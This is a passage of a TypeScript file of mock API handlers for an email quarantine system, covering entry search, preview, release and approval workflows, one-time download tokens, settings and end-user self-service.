  intIn('review', 'days', 1, BOUNDS.maxReviewDays);
  intIn('approvals', 'requestTtlHours', 1, 168);
  intIn('digest', 'maxEntries', 1, 200);
  intIn('alerts', 'minIntervalMinutes', 15, 1440);
  return violations;
}

function grantToken(): string {
  return `qdl1.${Buffer.from(crypto.randomUUID()).toString('base64url')}.${Buffer.from(crypto.randomUUID()).toString('base64url')}`;
}

export const fixtures: FixtureHandlers = {
  QuarantineToolsController_catalog_v1: (request) =>
    fixtureGuard(request) ??
    ok('QuarantineToolsController_catalog_v1', {
      states: [
        'held',
        'pending_approval',
        'releasing',
        'released',
        'rejected',
        'deleted',
        'expired',
        'superseded',
      ],
      kinds: ['quarantine', 'review'],
      origins: ['policy', 'manual', 'adopted'],
      reasons: [
        'spam',
        'bulk',
        'phishing',
        'malware',
        'bec',
        'dlp',
        'policy',
        'suspicious',
        'engine_unavailable',
        'manual',
      ],
      primaryEngines: ['rspamd', 'attachment', 'url', 'bec', 'dlp', 'sandbox', 'policy', 'none'],
      riskLevels: ['none', 'low', 'medium', 'high', 'critical'],
      releaseModes: ['operator', 'self', 'approved'],
      releaseStatuses: [
        'pending',
        'delivered',
        'failed',
        'blocked_by_revalidation',
        'dispatched',
        'approval_required',
        'rescan_required',
        'refused',
        'stale',
        'message_busy',
      ],
      approvalKinds: ['policy_review', 'release_approval', 'release_request'],
      approvalStatuses: ['pending', 'approved', 'denied', 'expired', 'cancelled'],
      approvalReasons: [
        'hard_block',
        'engine_failure',
        'risk_error',
        'risk_missing',
        'dlp_require_approval',
        'dlp_quarantine',
        'dlp_block',
        'dlp_missing',
        'scan_failed',
        'not_scanned',
        'policy_reject',
        'review',
        'stale_verdict',
        'no_scan_round',
      ],
      entryActions: ['preview', 'release', 'request_release', 'reject', 'delete', 'download'],
      bulkActions: ['release', 'reject', 'delete', 'approve', 'deny'],
      errorCodes: {
        quarantine_entry_not_found: 404,
        quarantine_state_conflict: 409,
        quarantine_rescan_required: 409,
        quarantine_approval_forbidden: 403,
        quarantine_download_disabled: 403,
        quarantine_reauth_failed: 401,
      },
      limits: LIMITS,
      selfService: {
        enabled: effective().endUser.enabled,
        preview: effective().endUser.preview,
        selfRelease: effective().endUser.selfRelease,
        selfReleaseReasons: effective().endUser.selfReleaseReasons,
        selfReleaseMaxLevel: effective().endUser.selfReleaseMaxLevel,
        requestRelease: effective().endUser.requestRelease,
        digestAllowOptOut: effective().digest.allowOptOut,
      },
      downloadEnabled: effective().download.enabled,
    }),
  QuarantineToolsController_summary_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    runExecutor();
    const range = rangeOf(request.query);
    if ('status' in range) return range;
    const counts: Record<string, number> = {};
    for (const { detail } of state().entries.values()) {
      const t = Date.parse(detail.quarantinedAt);
      if (t >= range.from && t < range.to) counts[detail.state] = (counts[detail.state] ?? 0) + 1;
    }
    const pendingApprovals = [...state().approvals.values()].filter(
      (a) => a.approval.status === 'pending',
    ).length;
    return ok('QuarantineToolsController_summary_v1', {
      from: new Date(range.from).toISOString(),
      to: new Date(range.to).toISOString(),
      counts,
      pendingApprovals,
    });
  },
  QuarantineEntriesController_search_v1: (request) =>
    fixtureGuard(request) ?? searchEntries(request, [...state().entries.values()], false),
  QuarantineEntriesController_detail_v1: withEntry((record, request) => {
    record.history.push({
      action: 'view',
      actor: actor(request),
      result: null,
      reason: null,
      at: new Date().toISOString(),
    });
    return {
      status: 200,
      body: detailFor(record, request),
      headers: { 'cache-control': 'no-store' },
    };
  }),
  QuarantineEntriesController_history_v1: withEntry((record) =>
    ok('QuarantineEntriesController_history_v1', {
      actions: record.history,
      releases: record.detail.releases,
    }),
  ),
  QuarantineEntriesController_preview_v1: withEntry((record) =>
    record.detail.contentAvailable
      ? ok('QuarantineEntriesController_preview_v1', previewOf(record))
      : apiError(410, 'quarantine_content_purged', 'The content was purged'),
  ),
  QuarantineEntriesController_grant_v1: withEntry((record, request) => {
    const body = bodyOf(request);
    if (!effective().download.enabled) {
      return apiError(
        403,
        'quarantine_download_disabled',
        'Downloads are disabled for this organization',
      );
    }
    if (
      typeof body.password !== 'string' ||
      body.password.length === 0 ||
      body.password === 'wrong'
    ) {
      return apiError(401, 'quarantine_reauth_failed', 'Re-authentication failed');
    }
    const d = record.detail;
    if (d.hardBlocks.length > 0 || d.reason === 'malware' || d.reason === 'phishing') {
      return apiError(409, 'quarantine_download_blocked', 'The content cannot be downloaded', {
        reason: d.hardBlocks.length > 0 ? 'hard_block' : 'verdict',
      });
    }
    const token = grantToken();
    const expiresAt = Date.now() + LIMITS.downloadTokenTtlSeconds * 1000;
    state().grants.set(token, {
      entryId: d.id,
      role: principalOf(request)?.role ?? '',
      used: false,
      expiresAt,
    });
    const attachment = body.object === 'attachment';
    return ok(
      'QuarantineEntriesController_grant_v1',
      {
        token,
        expiresAt: new Date(expiresAt).toISOString(),
        filename: attachment
          ? `part-${String(typeof body.partIndex === 'number' ? body.partIndex : 0)}.bin`
          : `${d.messageId}.eml.bin`,
        sizeBytes: attachment ? 48_000 : d.sizeBytes,
        sha256: sha(
          `${d.id}:download:${String(typeof body.partIndex === 'number' ? body.partIndex : 'eml')}`,
        ),
      },
      201,
    );
  }),
  QuarantineToolsController_download_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    const grant = state().grants.get(request.params.token ?? '');
    if (!grant || grant.role !== principalOf(request)?.role || grant.expiresAt < Date.now()) {
      return apiError(404, 'quarantine_download_token_invalid', 'Download token invalid');
    }
    if (grant.used)
      return apiError(410, 'quarantine_download_token_used', 'Download token already used');
    grant.used = true;
    return {
      status: 200,
      body: 'From: dev-fixture@example.test\r\nSubject: synthetic dev fixture content\r\n\r\nSynthetic content of the dev fixture mode.\r\n',
      headers: {
        'content-type': 'application/octet-stream',
        'content-disposition': 'attachment; filename="dev-fixture.eml.bin"',
        'x-content-type-options': 'nosniff',
        'cache-control': 'no-store',
      },
    };
  },
  QuarantineEntriesController_release_v1: withEntry((record, request) =>
    idempotent(request, () => {
      const body = bodyOf(request);
      return (
        reasonError(body) ??
        versionError(record, body) ??
        doRelease(record, request, String(body.reason))
      );
    }),
  ),
  QuarantineEntriesController_requestRelease_v1: withEntry((record, request) =>
    idempotent(request, () => {
      const body = bodyOf(request);
      const invalid = reasonError(body);
      if (invalid) return invalid;
      if (record.detail.state !== 'held')
        return apiError(409, 'quarantine_state_conflict', `The entry is ${record.detail.state}`);
      record.history.push({
        action: 'request_release',
        actor: actor(request),
        result: 'pending_approval',
        reason: String(body.reason),
        at: new Date().toISOString(),
      });
      const approval = createApproval(
        record,
        request,
        'release_request',
        record.detail.hardBlocks.length > 0 ? ['hard_block'] : [],
      );
      return ok(
        'QuarantineEntriesController_requestRelease_v1',
        {
          outcome: 'approval_requested',
          entryId: record.detail.id,
          state: 'pending_approval',
          approvalRequestId: approval.id,
          approvalReasons: approval.approvalReasons,
          rowVersion: record.detail.rowVersion,
        },
        202,
      );
    }),
  ),
  QuarantineEntriesController_reject_v1: withEntry((record, request) =>
    idempotent(request, () => {
      const body = bodyOf(request);
      return (
        reasonError(body) ??
        versionError(record, body) ??
        doReject(record, request, String(body.reason))
      );
    }),
  ),
  QuarantineEntriesController_delete_v1: withEntry((record, request) =>
    idempotent(request, () => {
      const body = bodyOf(request);
      return (
        reasonError(body) ??
        versionError(record, body) ??
        doDelete(record, request, String(body.reason))
      );
    }),
  ),
  QuarantineToolsController_bulk_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    return idempotent(request, () => {
      const body = bodyOf(request);
      const invalid = reasonError(body);
      if (invalid) return invalid;
      const ids = Array.isArray(body.ids) ? body.ids.map(String) : [];
      if (ids.length < 1 || ids.length > LIMITS.bulkMaxItems) {
        return apiError(400, 'quarantine_bulk_limit', 'Too many or too few items', {
          cause: 'items',
          maxItems: LIMITS.bulkMaxItems,
        });
      }
      const action = String(
        body.action,
      ) as SuccessBody<'QuarantineToolsController_bulk_v1'>['action'];
      if (!has(request, `quarantine:${action === 'deny' ? 'approve' : action}`)) {
        return apiError(403, 'forbidden', 'You do not have permission to perform this action');
      }
      const reason = String(body.reason);
      const results = ids.map((id) => {
        let response: FixtureResponse;
        if (action === 'approve' || action === 'deny') {
          const record = state().approvals.get(id);
          if (!record) return { id, status: 'not_found' as const };
          response =
            action === 'approve'
              ? doApprove(record, request, reason)
              : doDeny(record, request, reason);
        } else {
          const record = state().entries.get(id);
          if (!record) return { id, status: 'not_found' as const };
          response =
            action === 'release'
              ? doRelease(record, request, reason)
              : action === 'reject'
                ? doReject(record, request, reason)
                : doDelete(record, request, reason);
        }
        const out = (response.body ?? {}) as Record<string, unknown>;
        if (response.status >= 400)
          return { id, status: 'refused' as const, code: String(out.code) };
        if (out.outcome === 'approval_requested') {
          return {
            id,
            status: 'approval_requested' as const,
            approvalRequestId: String(out.approvalRequestId),
          };
        }
        if (out.outcome === 'queued' || typeof out.releaseId === 'string') {
          return { id, status: 'queued' as const, releaseId: String(out.releaseId) };
        }
        return { id, status: 'done' as const };
      });
      const counts: Record<string, number> = {};
      for (const result of results) counts[result.status] = (counts[result.status] ?? 0) + 1;
      return ok('QuarantineToolsController_bulk_v1', { action, results, counts });
    });
  },
  QuarantineToolsController_release_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    runExecutor();
    const record = state().releases.get(request.params.releaseId ?? '');
    if (!record) return apiError(404, 'quarantine_release_not_found', 'Release not found');
    return ok('QuarantineToolsController_release_v1', record.release);
  },
  QuarantineApprovalsController_list_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    const q = request.query;
    const statuses = listParam(q, 'status');
    const kinds = listParam(q, 'kind');
    const from = q.get('from') ? Date.parse(q.get('from') ?? '') : -Infinity;
    const to = q.get('to') ? Date.parse(q.get('to') ?? '') : Infinity;
    const items = [...state().approvals.values()]
      .map((r) => r.approval)
      .filter(
        (a) =>
          (!statuses || statuses.includes(a.status)) &&
          (!kinds || kinds.includes(a.kind)) &&
          Date.parse(a.requestedAt) >= from &&
          Date.parse(a.requestedAt) < to,
      )
      .sort((a, b) => b.requestedAt.localeCompare(a.requestedAt));
    const result = pageOf(items, q, filterHash(q), 'quarantine_cursor_invalid');
    if ('error' in result)
      return result.error ?? apiError(400, 'quarantine_cursor_invalid', 'Invalid cursor');
    return ok('QuarantineApprovalsController_list_v1', {
      items: result.page,
      nextCursor: result.nextCursor,
    });
  },
  QuarantineApprovalsController_get_v1: withApproval((record) =>
    ok('QuarantineApprovalsController_get_v1', record.approval),
  ),
  QuarantineApprovalsController_approve_v1: withApproval((record, request) =>
    idempotent(
      request,
      () =>
        reasonError(bodyOf(request)) ?? doApprove(record, request, String(bodyOf(request).reason)),
    ),
  ),
  QuarantineApprovalsController_deny_v1: withApproval((record, request) =>
    idempotent(
      request,
      () => reasonError(bodyOf(request)) ?? doDeny(record, request, String(bodyOf(request).reason)),
    ),
  ),
  QuarantineApprovalsController_cancel_v1: withApproval((record, request) =>
    idempotent(request, () => {
      const invalid = reasonError(bodyOf(request));
      if (invalid) return invalid;
      if (record.approval.kind === 'policy_review') {
        return apiError(409, 'quarantine_state_conflict', 'A policy review cannot be cancelled');
      }
      if (record.approval.status !== 'pending') {
        return apiError(
          409,
          'quarantine_approval_not_pending',
          'The approval request is not pending',
        );
      }
      const entry = state().entries.get(record.approval.entryId);
      record.approval.status = 'cancelled';
      record.approval.decidedAt = new Date().toISOString();
      record.approval.decisionReason = String(bodyOf(request).reason);
      if (entry) {
        entry.detail.state = 'held';
        entry.detail.rowVersion += 1;
      }
      return ok('QuarantineApprovalsController_cancel_v1', {
        approvalRequestId: record.approval.id,
        status: 'cancelled',
        entryId: record.approval.entryId,
        entryState: 'held',
        releaseId: null,
        messageTransition: null,
      });
    }),
  ),
  QuarantineToolsController_getSettings_v1: (request) =>
    fixtureGuard(request) ??
    ok('QuarantineToolsController_getSettings_v1', {
      effective: effective(),
      raw: state().raw,
      invalidStored: false,
      bounds: BOUNDS,
      rowVersion: state().rowVersion,
    }),
  QuarantineToolsController_putSettings_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    const body = bodyOf(request);
    if (body.expectedRowVersion !== state().rowVersion) {
      return apiError(409, 'quarantine_settings_conflict', 'The settings changed', {
        currentRowVersion: state().rowVersion,
      });
    }
    const violations = validateSettings(body.settings);
    if (violations.length > 0) {
      return apiError(400, 'quarantine_settings_invalid', 'The settings are invalid', {
        violations,
      });
    }
    state().raw = body.settings as Raw;
    state().rowVersion += 1;
    return ok('QuarantineToolsController_putSettings_v1', {
      effective: effective(),
      raw: state().raw,
      invalidStored: false,
      bounds: BOUNDS,
      rowVersion: state().rowVersion,
    });
  },
  QuarantineSelfController_search_v1: (request) =>
    fixtureGuard(request) ??
    (effective().endUser.enabled
      ? searchEntries(
          request,
          [...state().entries.values()].filter((e) => e.detail.recipient === selfAddress(request)),
          true,
        )
      : ok('QuarantineSelfController_search_v1', { items: [], nextCursor: null })),
  QuarantineSelfController_detail_v1: withEntry(
    (record) =>
      ok('QuarantineSelfController_detail_v1', {
        ...record.detail,
        allowedActions: selfAllowed(record),
      }),
    true,
  ),
  QuarantineSelfController_preview_v1: withEntry((record) => {
    if (!selfAllowed(record).includes('preview')) {
      return apiError(
        403,
        'quarantine_preview_not_allowed',
        'A preview is not allowed for this message',
      );
    }
    return ok('QuarantineSelfController_preview_v1', previewOf(record));
  }, true),
  QuarantineSelfController_release_v1: withEntry(
    (record, request) =>
      idempotent(request, () => {
        const body = bodyOf(request);
        const invalid = reasonError(body) ?? versionError(record, body);
        if (invalid) return invalid;
        if (!selfAllowed(record).includes('release')) {
          return apiError(
            403,
            'quarantine_self_release_not_allowed',
            'Self-release is not allowed',
            {
              cause: record.detail.hardBlocks.length > 0 ? 'hard_block' : 'reason_not_allowed',
            },
          );
        }
        const release = queueRelease(record, request, 'self', null);
        return ok(
          'QuarantineSelfController_release_v1',
          {
            outcome: 'queued',
            entryId: record.detail.id,
            state: 'releasing',
            releaseId: release.id,
            rowVersion: record.detail.rowVersion,
          },
          202,
        );
      }),
    true,
  ),
  QuarantineSelfController_requestRelease_v1: withEntry(
    (record, request) =>
      idempotent(request, () => {
        const body = bodyOf(request);
        const invalid = reasonError(body);
        if (invalid) return invalid;
        if (!selfAllowed(record).includes('request_release')) {
          return apiError(409, 'quarantine_state_conflict', 'A release cannot be requested now');
        }
        const approval = createApproval(record, request, 'release_request', []);
        return ok(
          'QuarantineSelfController_requestRelease_v1',
          {
            outcome: 'approval_requested',
            entryId: record.detail.id,
            state: 'pending_approval',
            approvalRequestId: approval.id,
            approvalReasons: [],
            rowVersion: record.detail.rowVersion,
          },
          202,
        );
      }),
    true,
  ),
  QuarantineSelfController_preferences_v1: (request) =>
    fixtureGuard(request) ??
    ok('QuarantineSelfController_preferences_v1', {
      digestOptOut: state().preferences.get(selfAddress(request)) ?? false,
      allowOptOut: effective().digest.allowOptOut,
    }),
  QuarantineSelfController_putPreferences_v1: (request) => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    const body = bodyOf(request);
    if (typeof body.digestOptOut !== 'boolean') {
      return apiError(400, 'validation_failed', ['digestOptOut: must be a boolean']);
    }
    if (body.digestOptOut && !effective().digest.allowOptOut) {
      return apiError(
        403,
        'forbidden',
        'Opting out of the digest is not allowed by your organization',
      );
    }
    state().preferences.set(selfAddress(request), body.digestOptOut);
    return ok('QuarantineSelfController_putPreferences_v1', {
      digestOptOut: body.digestOptOut,
      allowOptOut: effective().digest.allowOptOut,
    });
  },
};
